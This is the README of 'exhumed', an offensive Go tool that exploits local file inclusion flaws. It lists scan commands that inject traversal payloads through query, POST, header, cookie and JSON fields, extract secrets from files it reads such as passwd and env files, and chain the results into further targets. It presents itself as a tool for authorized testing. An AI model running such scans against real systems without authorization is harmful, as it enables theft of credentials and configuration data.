# exhumed

> *Some files don't stay buried.*

Modern LFI exploitation CLI and a revival of the abandoned `panoptic`.
Point it at a vulnerable parameter and it walks a curated database of
high-value file paths to find what's readable and extract content for
follow-on targeting...

---

> **LEGAL / ETHICAL USE NOTICE**
>
> `exhumed` is for **authorized security testing and bug bounty work only**.
> Using it against systems you do not have explicit, written permission to test
> is **illegal** and may violate computer fraud laws in your jurisdiction.
> You are solely responsible for ensuring your use complies with applicable law
> and the scope of any authorization you hold.
> The authors accept no liability for misuse.

---

## Status

**Under active development — pre-v1.0.** APIs and output formats may change
between packets. Do not depend on stability yet.

---

## Build from source

Requires Go 1.26+. No cgo. Produces a single static binary.

```bash
git clone https://github.com/bugsyhewitt/exhumed.git
cd exhumed

# plain build (version = dev)
CGO_ENABLED=0 go build -o exhumed ./cmd/exhumed

# release build with version metadata
CGO_ENABLED=0 go build \
  -ldflags "-X github.com/bugsyhewitt/exhumed/internal/version.Version=0.1.0 \
            -X github.com/bugsyhewitt/exhumed/internal/version.Commit=$(git rev-parse --short HEAD) \
            -X github.com/bugsyhewitt/exhumed/internal/version.Date=$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  -o exhumed ./cmd/exhumed
```

---

## Usage (Packet 01 — evolving)

### `scan`

Fire traversal payloads at a vulnerable parameter. The URL must contain the
injection marker (default `FUZZ`):

```bash
# Basic scan against query parameter
exhumed scan --url "http://target.local/?file=FUZZ"

# POST body injection
exhumed scan --url "http://target.local/load" \
             --method POST \
             --data "path=FUZZ"

# Header injection
exhumed scan --url "http://target.local/read" \
             -H "X-Include-File: FUZZ"

# Cookie injection
exhumed scan --url "http://target.local/view" \
             -b "lfi_path=FUZZ"

# JSON body injection
exhumed scan --url "http://target.local/api/file" \
             --method POST \
             --data '{"path":"FUZZ"}' \
             -H "Content-Type: application/json"

# Tune concurrency, rate, and depth
exhumed scan --url "http://target.local/?file=FUZZ" \
             --concurrency 20 \
             --rate 50 \
             --traversal-depth 12 \
             --timeout 15s

# Verbose output (shows injection surface and payload preview)
exhumed scan --url "http://target.local/?file=FUZZ" --verbose

# Route through Burp Suite
exhumed scan --url "http://target.local/?file=FUZZ" \
             --proxy http://127.0.0.1:8080 \
             --insecure
```

### Resumable scans

A full scan over a large database × many traversal techniques × traversal depth
is thousands of requests. If you Ctrl-C, hit a rate limit, or the target flaps,
`--resume` lets you pick up where you left off instead of re-hammering the target
from scratch — a scan-time *and* stealth win.

```bash
# Persist per-entry progress to a state file. Run it, interrupt it (Ctrl-C),
# then run the exact same command again — already-attempted entries are skipped
# and prior confirmed hits are replayed in the summary.
exhumed scan --url "http://target.local/?file=FUZZ" --resume scan.state

# Same command resumes; new run only scans what wasn't attempted yet.
exhumed scan --url "http://target.local/?file=FUZZ" --resume scan.state
```

The state file is bound to the `(target, marker, database)` triple it was created
against. Resuming with a different target, marker, or database is **refused**
(fail-closed) — otherwise the skip-set would silently hide entries that were never
actually attempted against the current scan. Delete the file to start fresh. State
is flushed atomically after every entry, so an interrupted scan never corrupts it.

### Local testbed (deliberately vulnerable dev server)

```bash
# Start the testbed (localhost only, sandboxed fake filesystem)
go run ./testbed/server

# Then scan against it
exhumed scan --url "http://127.0.0.1:8080/?file=FUZZ" --verbose
```

### JSON output

Pass `--output json` to emit a single machine-readable JSON document instead of
the default human-readable text. The document is written to stdout after the scan
completes and is suitable for piping to `jq`, logging to SIEM, or feeding
downstream automation:

```bash
# Structured JSON output
exhumed scan --url "http://target.local/?file=FUZZ" --output json

# Pipe to jq for pretty inspection
exhumed scan --url "http://target.local/?file=FUZZ" --output json | jq '.hits[].findings'

# Extract confirmed file paths
exhumed scan --url "http://target.local/?file=FUZZ" --output json | jq -r '.hits[].path'

# Only emit secrets (filter in jq)
exhumed scan --url "http://target.local/?file=FUZZ" --output json --show-secrets \
  | jq '.hits[].findings[] | select(.type == "secret")'
```

The JSON schema is versioned (`schema_version: "1"`). Top-level fields:

| Field | Type | Description |
|---|---|---|
| `schema_version` | string | Format version for downstream parsers |
| `started_at` / `completed_at` | RFC3339 | Scan wall-clock times |
| `target` | string | The scanned URL |
| `total_requests` | int | HTTP requests fired |
| `confirmed_hits` | int | Files successfully read |
| `chain_targets_queued` | int | Follow-on paths generated |
| `hits` | array | Each confirmed hit with findings |

Each hit includes `entry_id`, `path`, `technique`, `status_code`, `elapsed_ms`,
`snippets`, `findings`, `chain` (bool), and `chain_depth`.

### Other commands

```bash
exhumed version          # print version, commit, date
exhumed version --db     # also print the active database version and source
exhumed update           # update file database (Packet 05 — stub for now)
exhumed --help
exhumed scan --help
```

`exhumed version --db` resolves the same database that `scan` and `db` would
load — the freshest of the bundled database and the feed cache — and prints its
version and source, so you can answer "am I current?" without running a scan:

```
exhumed dev (commit: none, built: unknown)
database 2026-05-20 (cache, /home/user/.cache/exhumed)
```

Database versions are compared with proper [semantic versioning](https://semver.org/)
(`golang.org/x/mod/semver`) when both versions are semver-shaped, so `1.10.0`
correctly outranks `1.9.0`. Date-based versions (`YYYY-MM-DD`) fall back to
lexicographic comparison, which is correct for fixed-width dates.

---

## Roadmap to v1.0

1. **Repo scaffold, HTTP engine, injection layer, traversal generator, testbed** ✅
2. **Versioned file database** — curated high-value paths loaded from local files ✅
3. **Remote feed** — `exhumed update` pulls the latest database from a versioned feed ✅
4. **Detection engine** — confirms successful inclusion via regex/keyword matching ✅
5. **Content extraction** — format-aware parsers (passwd, PHP config, env files, etc.) ✅
6. **Recursive follow-on chaining** — use extracted content to generate next targets ✅
7. **JSON-first output** — machine-readable results plus a human TTY mode ✅
8. **Single static binary release** — cross-compiled for Linux/macOS/Windows via GoReleaser

---

## License

MIT — see [LICENSE](LICENSE).
